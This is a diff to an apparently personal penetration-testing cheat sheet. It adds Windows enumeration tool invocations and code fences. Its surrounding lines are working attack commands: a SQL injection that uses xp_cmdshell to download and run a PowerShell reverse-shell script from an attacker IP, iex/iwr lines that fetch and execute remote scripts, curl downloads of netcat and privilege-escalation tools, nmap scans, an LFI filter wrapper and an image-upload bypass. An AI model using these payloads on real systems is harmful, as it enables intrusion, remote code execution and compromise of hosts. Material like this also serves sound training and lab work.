@@ -149,13 +149,15 @@ Automated tools.
 . .\PowerUp.ps1
 . .\Invoke-SessionGopher.ps1
 .\amorous.ps1
+.\Seatbelt.exe -group=all -full
+.\winpspy.exe
 Invoke-AllChecks
 Invoke-SessionGopher -Thorough
 ```
 
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
-
+'
 iex(iwr -uri 192.168.45.178:8000/transfer_files.ps1 -usebasicparsing)
 iex(iwr -uri 10.10.14.8:8000/transfer_files.ps1 -usebasicparsing)
 curl 10.10.14.8:8000/nc.exe -o nc.exe
@@ -222,6 +224,7 @@ curl http://192.168.45.163:8000/linpeas.sh -o linpeas.sh;chmod +x linpeas.sh;
 curl http://192.168.45.163:8000/pspy64 -o pspy64;chmod +x pspy64;./pspy64
 ```
 
+```bash
 ===Nmap====
 nmap -p- -sT -sV -A $ip
 nmap -p- -sC -sV $ip --open
@@ -331,3 +334,4 @@ php://filter/convert.base64-encode/resource=
 
 UPLOAD IMAGE?
 GIF89a1
+```
